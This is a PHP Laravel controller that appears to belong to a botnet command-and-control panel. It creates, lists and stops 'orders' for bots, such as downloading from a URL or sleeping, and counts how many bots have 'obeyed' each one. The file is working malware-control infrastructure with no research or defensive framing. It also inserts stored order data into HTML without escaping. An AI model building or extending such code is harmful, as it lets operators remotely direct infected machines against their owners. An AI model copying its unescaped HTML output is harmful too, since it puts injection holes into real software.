<?php

namespace App\Http\Controllers;

use App\Bot;
use App\Obeyed;
use App\Order;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;


class OrdersController extends Controller
{


    /**
     * Get the orders constructor
     *
     * @param $request_
     *
     * @return array->collection
     */

    public static function OrderConstructor($request_){
        return OrdersController::getOrders($request_);
    }

    /**
     * Get the orders info
     *
     * @param $request_
     *
     * @return array->collection
     */

    private static function getOrders($request_){


        //Get panelCredential for the auth User
        $panelCredential = Auth::user()->panelCredential()->first();

        $take = $request_['take'];
        $seeMore = 0;
        $array = array();
        $i = 0;


        $allOrders = $panelCredential->orders()->count();
        $botsNumber = $panelCredential->bots()->count();
        if($allOrders > $take){
              $seeMore = 1;
        }
            //Get all the orders for this User
        $orders = $panelCredential->orders()->orderBy('status', 'desc')->orderBy('created_at', 'desc')->take($take)->get();




        if($orders !== null){
            foreach($orders as $order){

                $order['action'] == 'download' ? $lableName = 'url' : $lableName = 'sleep_time';
                $order['status'] === 1 ? $status = '<b style="color: greenyellow">on</b>' : $status = '<b style="color: red" >off</b>';
                $order['status'] === 1 ? $comands = '<div class="col-centered stopBtn" data-id="'.$order['id'].'" ><p style=" margin-top: 0px">Stop</p></div>' : $comands = '';
                $data = '{<b class="dataJsonTitle" >action</b> : <b class="dataJsonLight" >'.$order['action'].'</b> , <b class="dataJsonTitle">'.$lableName.'</b> :<b class="dataJsonLight">'.$order['data'].'</b>}';

                $array[$i] = [
                    'id'=>$order['id'],
                    'data'=>$data,
                    'obeyed'=> OrdersController::getObeyedEntrys($order['id']).'/'.$botsNumber,
                    'time_ago'=>$order['created_at']->diffForHumans(),
                    'status'=> $status,
                    'comands'=>$comands
                ];

                $i++;
            }
        }


        $obj = array();
        $obj['array'] =  $array;
        $obj['seeMore']  =$seeMore;

        return $obj;

    }

    /**
     * Save data on Db
     *
     * @param $request
     *
     * @return array
     */

    public function createOrder(Request $request){

        //Get panelCredential for the auth User
        $panelCredential = Auth::user()->panelCredential()->first();

        $action = $request['action'];
        $data = $request['data'];

        try {
            Order::create(['panel_credential_id'=>$panelCredential->id,'action'=>$action, 'data'=>$data,'status'=>true]);
            $returnArray = ['msg'=>'Successful added order','type'=>'added'];
        } catch (Throwable $t) {
            $returnArray = ['msg'=>'Fail added order','type'=>'fail'];
        }

        return $returnArray;

    }

    /**
     * Get the orders info
     *
     * @param null
     *
     * @return array
     */

    public static function getOrdersInfo(){

        //Todo->BotDB ->check the data from db
        return OrdersController::getOrders(['take'=>5]);

    }


    /**
     * Stop Order
     *
     * @param $data
     *
     * @return array
     */

    public static function stopOrder($data){

        //Get panelCredential for the auth User
        $panelCredential = Auth::user()->panelCredential()->first();

        $id = $data['id'];
        $order = $panelCredential->orders()->where('id', $id)->first();
        //$order = Order::where('id', $id)->where('panel_credential_id',$panelCredential->id)->first();

        try{
            $order->status = false;
            $order->update();
            $return = ['type'=>1, 'msg'=>'Order Stopped'];
        }catch(Throwable $t){
            $return = ['type'=>0, 'msg'=>'Try Later'];
        }


        return $return;

    }

    /**
     * Create an entry to an order tacked by an bot
     *
     * @param $bot_id
     * @param $order_id
     *
     *
     */

    public static function newObeyedEntry($bot_id, $order_id){
        $obeyed = Obeyed::create(['order_id'=>$order_id, 'bot_id'=>$bot_id]);
        return $obeyed;
    }

    /**
     * Return the Obeyed number
     *
     * @param $order_id
     *
     * @return array
     */
    private static function getObeyedEntrys($order_id){
        $obeyed = Obeyed::where('order_id',$order_id)->get()->count();
        return $obeyed;
    }

}
